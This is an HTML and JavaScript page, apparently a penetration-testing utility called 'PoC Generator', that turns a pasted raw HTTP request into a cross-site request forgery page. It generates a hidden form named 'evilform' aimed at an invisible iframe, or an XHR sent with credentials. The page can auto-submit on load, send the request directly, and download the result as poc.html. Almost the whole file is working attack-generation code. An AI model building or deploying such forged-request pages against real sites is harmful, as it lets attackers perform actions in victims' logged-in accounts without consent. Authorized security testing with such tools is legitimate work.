<!DOCTYPE html>

<html>
<head>
    <meta charset="utf-8">
    <meta name="author" content="takubokudori">
    <meta name="description" content="Generate CSRF PoC form">
    <link rel="author" href="https://github.com/takubokudori"/>
    <title>PoC Generator</title>
</head>
<body>
<style>
    .hide {
        visibility: hidden;
    }
</style>
<script>
    class HTTPRequest {
        /*
        rawLine_;
        rawHeader_;
        rawBody_;
        line_;
        header_;
        body_;
        httpRequest_;
        success_;
        */
        static separate_(str, delimiter) {
            if (typeof str !== 'string' || typeof delimiter !== 'string') return str;
            const idx = str.indexOf(delimiter);
            return [str.substring(0, idx), str.slice(idx + delimiter.length)];
        }

        constructor(httpRequest) {
            this.success_ = false;
            this.analyzeHTTPRequest(httpRequest);
        }

        analyzeHTTPRequest(httpRequest) {
            this.success_ = false;
            this.httpRequest_ = httpRequest;
            httpRequest = httpRequest.replace(/\r?\n/g, "\r\n");
            const http = HTTPRequest.separate_(httpRequest, "\r\n\r\n");
            let httpHeader = HTTPRequest.separate_(http[0], "\r\n");
            const rawLine = httpHeader[0];
            const rawHeader = httpHeader[1];
            const rawBody = http[1];
            const httpLine = HTTPRequest.analyzeLine(httpHeader[0]);
            if (httpLine === false) return false;
            httpHeader = HTTPRequest.analyzeHeader(httpHeader[1]);
            if (httpHeader === false) return false;
            let httpBody = [];
            if (typeof httpHeader['Content-Type'] !== 'undefined') httpBody = this.analyzeHTTPBody(http[1], httpHeader['Content-Type']);
            else httpBody = this.analyzeHTTPBody(http[1]);
            if (httpBody === false) return false;

            this.rawLine_ = rawLine;
            this.rawHeader_ = rawHeader;
            this.rawBody_ = rawBody;
            this.line_ = httpLine;
            this.header_ = httpHeader;
            this.body_ = httpBody;
            this.success_ = true;
        }

        static analyzeLine(line) {
            const q = line.split(' ');
            if (q.length !== 3) return false;
            const method = q[0];
            const url = q[1];
            const version = q[2];

            return {
                'method': method,
                'url': url,
                'version': version
            };
        }

        static analyzeHeaderOption(headerValue) {
            let v = headerValue.split('; ');
            const ret = [];
            for (const i in v) {
                let k = v[i].split('=');
                if (k.length === 1) ret.push(k[0]); // string
                else ret.push(k); // array
            }
            return ret;
        }

        static analyzeHeader(headers) {
            headers = headers.split(/\r\n|\n/);
            const ret = {
                'custom': [], // custom headers
            };
            for (const i in headers) {
                const h = HTTPRequest.separate_(headers[i], ':');
                if (h.length === 2) {
                    h[0] = h[0].trim(); // header name
                    h[1] = h[1].trim(); // value
                    if (!forbiddenHeader[h[0]]) ret['custom'].push(h); // custom header
                    else { // forbidden header
                        ret[h[0]] = HTTPRequest.analyzeHeaderOption(h[1]);
                    }
                }
            }
            return ret;
        }

        static analyzeHTTPHeader(httpHeader) {
            httpHeader = HTTPRequest.separate_(httpHeader, "\r\n");
            /* httpHeader[0]->requestLine, httpHeader[1]->header */
            const line = HTTPRequest.analyzeLine(httpHeader[0]);
            if (line === false) return false;
            const headers = HTTPRequest.analyzeHeader(httpHeader[1]);
            if (headers === false) return false;
            return {
                'line': line,
                'headers': headers,
            };
        }

        analyzeHTTPBody(httpbody, contentType = "") {
            let ret;
            if (contentType[0] === "multipart/form-data") {
                let boundary = "";
                for (let i in contentType) {
                    if (typeof contentType[i] === 'array' && contentType[i][0] === 'boundary') {
                        boundary = contentType[i][1];
                        break;
                    }
                }
                ret = HTTPRequest.analyzeMultipartParams(httpbody, boundary);
            } else {
                ret = HTTPRequest.analyzeParams(httpbody);
            }
            return ret;
        }

        static analyzeMultipartParams(params, boundary) {
            if (typeof params !== 'string' || params === '') return [];
            var dict = [];
            params = params.split('--' + boundary);
            return dict;
        }

        static analyzeParams(params) {
            if (typeof params !== 'string' || params === '') return [];
            const param = params.split("&");
            const dict = [];
            for (const i in param) {
                const t = param[i].split("=");
                dict.push(t);
            }
            return dict; // dict[0][0]=name dict[0][1]=value
        }

        get rawHeader() {
            return this.rawHeader_;
        }

        get rawBody() {
            return this.rawBody_;
        }

        get rawLine() {
            return this.rawLine_;
        }

        get header() {
            return this.header_;
        }

        get body() {
            return this.body_;
        }

        get line() {
            return this.line_;
        }

        get httpRequest() {
            return this.httpRequest_;
        }

        get success() {
            return this.success_;
        }
    }

    let form;

    if (!String.prototype.trim) { // for IE <9
        String.prototype.trim = function () {
            return this.replace(/^\s+|\s+$/g, '');
        };
    }
    const forbiddenHeader = {
        'Accept-Charset': '1',
        'Accept-Encoding': '1',
        'Access-Control-Request-Headers': '1',
        'Access-Control-Request-Method': '1',
        'Connection': '1',
        'Content-Length': '1',
        'Content-Type': '1',
        'Cookie': '1',
        'Cookie2': '1',
        'Date': '1',
        'DNT': '1',
        'Expect': '1',
        'Host': '1',
        'Keep-Alive': '1',
        'Origin': '1',
        'Proxy-': '1',
        'Sec-': '1',
        'Referer': '1',
        'TE': '1',
        'Trailer': '1',
        'Transfer-Encoding': '1',
        'Upgrade': '1',
        'Via': '1'
    };

    const enctypes = {
        "application/x-www-form-urlencoded": 1, // 1->selected
        "multipart/form-data": 2,
        "application/json": 2,
        "text/plain": 2
    };
    const formfunc = {
        generate: function () {
            let ezhtml = "";
            const req = getRequest();
            if (req === false) return false;
            ezhtml += '<form target="dummyfrm" name="evilform" action="' + req['url'] + '" method="' + req['method'] + '" enctype="' + req['enctype'] + '">\n';
            var params = req['params'];
            for (const i in params) {
                ezhtml += '<input type="' + ((!isAutoSubmit() && isSpecifiable()) ? ("text") : ("hidden")) + '" name="' + escapeHTML(URLdecode(params[i][0])) + '" value="' + escapeHTML(URLdecode(params[i][1])) + '" />\n';
            }
            ezhtml += '</form>\n';
            ezhtml += '<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>';
            setEvilHTMLcontent(ezhtml);

            setEvilTextContent(ezhtml);
            errorMsg("");
            return true;
        },

        generateHTML: function (title, bodyhtml) {
            let content = getHTMLheader(title);
            content += '<body';
            if (isAutoSubmit()) content += ' onload="document.evilform.submit();"';
            content += '>\n';
            content += bodyhtml;
            if (!isAutoSubmit()) {
                content += '<button onclick="csrfSubmit();">submit</button>\n';
                content += '<sc' + 'ript>\n';
                content += 'function csrfSubmit(){\n';
                content += 'var submit = HTMLFormElement.prototype["submit"].bind(document.evilform);\n';
                content += 'submit();\n';
                content += '}\n';
                content += '</sc' + 'ript>\n';
            }
            content += '\n<p>' + title + '</p>\n';
            content += '</body>\n';
            content += getHTMLfooter();
            return content;
        },

        send: function () {
            const req = getRequest();
            document.getElementById("stat").innerHTML += "<p>Request sent.</p><p>" + escapeHTML(req['url']) + "</p><p>" + escapeHTML(req['params']) + "</p><hr />";
            const submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
            submit();
        }

    };

    const xhrfunc = {
        generate: function () {
            const req = getRequest();
            if (req === false) return false;
            let ezhtml = "";
            ezhtml += "function csrfXHR(){\n";
            ezhtml += "var xhr=new XMLHttpRequest();\n";
            ezhtml += "xhr.open('" + req['method'] + "','" + req['url'] + "');\n";
            ezhtml += "xhr.withCredentials = true;\n";
            ezhtml += "xhr.setRequestHeader('Content-Type','" + req['enctype'] + ";'";
            if (req['enctype'] === "multipart/form-data") ezhtml += "+' boundary=" + req['boundary'] + "'";
            ezhtml += ");\n";
            ezhtml += "xhr.send('" + escapeJavascriptCRLF(getParamsRaw()) + "');\n";
            ezhtml += "}\n";
            setEvilTextContent(ezhtml, true);
            setEvilHTMLcontent(ezhtml);
            return true;
        },

        generateHTML: function (title, bodyhtml) {
            let content = getHTMLheader(title);
            content += '<body';
            if (isAutoSubmit()) content += ' onload="csrfXHR();"';
            content += '>\n';
            content += bodyhtml;
            if (!isAutoSubmit()) content += '<button onclick="csrfXHR();">submit</button>\n';
            content += '\n<p>' + title + '</p>\n';
            content += '</body>\n';
            content += getHTMLfooter();
            return content;
        },

        send: function () {
            eval(document.getElementById("evilzone").textContent);
            csrfXHR();
        }
    };

    let func;

    window.onload = function () {
        form = document.forms.messageForm;
        func = formfunc;
        for (const key in enctypes) {
            let op = document.createElement("option");
            op.value = key;
            op.innerText = key;
            if (enctypes[key] === 1) op.selected = true;
            form.enctype.appendChild(op);
        }
        let op = document.createElement("option"); // append other
        op.value = "other";
        op.innerText = "other";
        form.enctype.appendChild(op);
    };

    /**
     * @return {string}
     */
    function URLencode(str) {
        if (typeof str !== 'string') return str;
        return encodeURIComponent(str.replace(/\r?\n/g, "\r\n"));
    }

    /**
     * @return {string}
     */
    function URLdecode(str) {
        if (typeof str !== 'string') return str;
        return decodeURIComponent(str.replace(/\+/g, '%20'));
    }


    function escapeHTML(str) {
        if (typeof str !== 'string') return str;
        return str.replace(/[&'`"<>\n\r]/g, function (match) {
            return {
                '\r': '&#x0D',
                '\n': '&#x0A',
                '&': '&amp;',
                "'": '&#x27;',
                '`': '&#x60;',
                '"': '&quot;',
                '<': '&lt;',
                '>': '&gt;',
            }[match]
        });
    }

    function escapeJavascript(str) {
        return str.replace(/['"\\\n\r]/g, function (match) {
            return {
                '\r': '\\r',
                '\n': '\\n',
                "'": '\\\'',
                '"': '\\\"',
                "\\": '\\\\',
            }[match]
        });
    }

    function escapeJavascriptCRLF(str) {
        return str.replace(/[\n\r]/g, function (match) {
            return {
                '\r': '\\r',
                '\n': '\\n',
            }[match]
        });
    }

    function errorMsg(msg) {
        if (typeof msg !== 'string') return msg;
        document.getElementById("errormsg").textContent = msg;
    }

    function setEvilHTMLcontent(ezhtml) {
        document.getElementById("evilzone").innerHTML = ezhtml;
    }

    function setEvilTextContent(ezhtml, isScript = false) {
        if (isScript) ezhtml = "<" + "script>\n" + ezhtml + "</" + "script>\n";
        document.getElementById("nowhtml").innerText = ezhtml;
    }

    function triggerFunc() {
        const sm = form.sendmethod.value;
        eval('func=' + sm + ';');
    }


    function triggerAuto() {
        const as = form.autosubmit.checked;
        if (as) {
            document.getElementById("div-specifiable").style.visibility = "hidden";
        } else {
            document.getElementById("div-specifiable").style.visibility = "visible";
        }
    }

    function triggerEnctype() {
        const enctype = form.enctype.value;
        if (enctype === "multipart/form-data") {
            document.getElementById("div-boundary").style.visibility = "visible";
        } else {
            document.getElementById("div-boundary").style.visibility = "hidden";
        }
        if (enctype === "other") {
            document.getElementById("span-enctypeother").style.visibility = "visible";
        } else {
            document.getElementById("span-enctypeother").style.visibility = "hidden";
        }
    }

    function generatePoC(isSubmit) {
        const success = func.generate();
        if (success && isSubmit) func.send();
    }

    function getRequest() {
        const url = getURL();
        if (url === "") {
            errorMsg("URL is empty!");
            return false;
        }
        const method = getMethod();
        if (method === "") {
            errorMsg("method is empty!");
            return false;
        }
        const enctype = getEnctype();
        if (enctype === "") {
            errorMsg("enctype is empty!");
            return false;
        }
        const params = getParams();
        if (params === false) {
            errorMsg("params is empty!");
            return false;
        }
        const boundary = form.boundary.value;
        return {
            'url': url,
            'method': method,
            'enctype': enctype,
            'params': params,
            'boundary': boundary
        };
    }

    function getURL() {
        return form.url.value;
    }

    function getMethod() {
        return form.method.value;
    }

    function getEnctype() {
        const et = form.enctype.value;
        if (et === "other") return form.enctypeother.value;
        return et;
    }

    function isAutoSubmit() {
        return form.autosubmit.checked;
    }

    function isSpecifiable() {
        return form.specifiable.checked;
    }

    function detectBoundary() {
        let pm = getParamsRaw();
        pm = pm.split(/\r\n|\n/);

        let k;
        for (let i = pm.length - 1; i >= 0; i--) {
            k = pm[i].match(/^--[0-9a-zA-Z-]+--$/g);
            if (k != null && k.length === 1) {
                form.boundary.value = k[0].slice(2, k.length - 3);
                return;
            }
        }
        errorMsg("failed to detect boundary!Is params perfect format?");

    }

    function getParamsRaw() {
        return form.params.value;
    }

    function getParams() {
        const params = getParamsRaw();
        if (params === "") return false;
        const param = params.split("&");
        const dict = [];
        for (const i in param) {
            const t = param[i].split("=");
            dict.push(t);
        }
        return dict;
    }

    function getHeaderOptionParams(headerValue) {
        // aaa; test=example; charset=UTF-8
        let a = headerValue.split(';');
        const arr = [];
        // arr[0]="string"
        arr.push(a[0]);
        for (let i = 1; i < a.length; i++) {
            a = a[i];
        }
        return arr;
    }


    function sendPoC() {
        func.send();
    }

    function analyzeRequest() {
        const req = form.httprequest.value;
        if (req === "") {
            errorMsg("Raw HTTP request is empty!");
            return;
        }
        let a = new HTTPRequest(req);
        if (!a.success) {
            errorMsg("failed to parse HTTP request!");
            return;
        }
        form.url.value = a.line['url'];
        form.method.value = a.line['method'];
        if (typeof a.header['Content-Type'] !== 'undefined') {
            if (enctypes[a.header['Content-Type'][0]]) form.enctype.value = a.header['Content-Type'][0];
            else {
                form.enctype.value = "other";
                form.enctypeother.value = a.header['Content-Type'][0];
            }
            triggerEnctype();
        }
        form.params.value = a.rawBody;
        form.headers.value = a.rawHeader;
    }

    function executeDownload(name, content, mimeType) {
        const blob = new Blob([content], {type: mimeType});

        const a = document.createElement('a');
        a.download = name;
        a.target = '_blank';
        if (window.navigator.msSaveBlob) {
            window.navigator.msSaveBlob(blob, name)
        }
        else if (window.URL && window.URL.createObjectURL) {
            a.href = window.URL.createObjectURL(blob);
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
        else if (window.webkitURL && window.webkitURL.createObject) {
            a.href = window.webkitURL.createObjectURL(blob);
            a.click();
        }
        else {
            window.open('data:' + mimeType + ';base64,' + window.Base64.encode(content), '_blank');
        }
    }

    function getHTMLheader(title = "CSRF PoC") {
        let content = '<!DOCTYPE html>\n\n';
        content += '<html>\n';
        content += '<head>\n';
        content += '<meta charset="utf-8">\n';
        content += '<title>' + title + '</title>\n';
        content += '</head>\n';
        return content;
    }

    function getHTMLfooter() {
        let content = '</html>\n';
        return content;
    }

    function downloadHTML() {
        const nh = document.getElementById("nowhtml");
        if (nh.textContent === "") {
            errorMsg("No downloadable HTML! generate form!");
            return;
        }
        let title = form.title.value;
        let content;
        content = func.generateHTML(title, nh.innerText);

        const mimeType = 'text/plain';
        const name = "poc.html";
        executeDownload(name, content, mimeType);
    }
</script>
<h1>PoCGenerator v1.3</h1>

<div>
    URLencode:<textarea id="uea" name="urlencodearea" rows="1" cols="60" title="URL encode"></textarea>
    <button name="encodeIT"
            onclick="document.getElementById('uea').value=URLencode(document.getElementById('uea').value);return false;">
        URL encode
    </button>
</div>
<hr>


<span id="errormsg" style="color:red;"></span>

<form name="messageForm">
    <div>send :
        <input type="radio" name="sendmethod" id="form-method" value="formfunc" onclick="triggerFunc();" checked><label
                for="form-method">Form</label>
        <input type="radio" name="sendmethod" id="xhr-method" value="xhrfunc" onclick="triggerFunc();"><label
                for="xhr-method">XHR</label></div>
    <div>automatic submitting:<input type="checkbox" name="autosubmit" value="autosubmit"
                                     onclick="triggerAuto();return true;" checked title="Automatic submitting"/></div>
    <div class="hide" id="div-specifiable">specifiable:<input type="checkbox" name="specifiable" value="specifiable"
                                                              title="Specifiable parameter"/>
    </div>
    <div>HTTP Request:<br/>
        <textarea name="httprequest" rows="6" cols="60" title="HTTP Request"></textarea><br/>
        <button name="analyze" onclick="analyzeRequest();return false;">analyze</button>
    </div>
    <div>URL:<input type="text" name="url" size="50" title="URL"/></div>
    <div>method: <input type="text" name="method" size="8" value="POST" title="method"/></div>
    <div>headers: <textarea name="headers" rows="6" cols="40" title="header"></textarea></div>
    <div>enctype: <select name="enctype" onchange="triggerEnctype();" title="enctype">
    </select><span class="hide" id="span-enctypeother">other:<input type="text" name="enctypeother" size="20" value=""
                                                                    title="enctype"/></span>
    </div>
    <div class="hide" id="div-boundary">boundary: <input type="text" name="boundary" size="20" value=""
                                                         title="boundary"/>
        <button onclick="detectBoundary();return false;">detect boundary</button>
    </div>
    <div>params:<br/>
        <textarea name="params" rows="6" cols="60" title="Parameter"></textarea><br/>
        <button name="generate" onclick="generatePoC(true);return false;">generate and submit</button>
        <button name="generate" onclick="generatePoC(false);return false;">generate only</button>
    </div>
    <div>title:<input type="text" name="title" size="20" value="CSRF PoC" title="HTML title"/>
        <button name="downloadhtml" onclick="generatePoC();downloadHTML();return false;">download HTML</button>
    </div>
</form>
<div id="evilzone" style="visibility:hidden;display:none;"></div>
<hr/>
<div id="nowhtml"></div>
<hr/>
<p id="stat"></p>
</body>
</html>
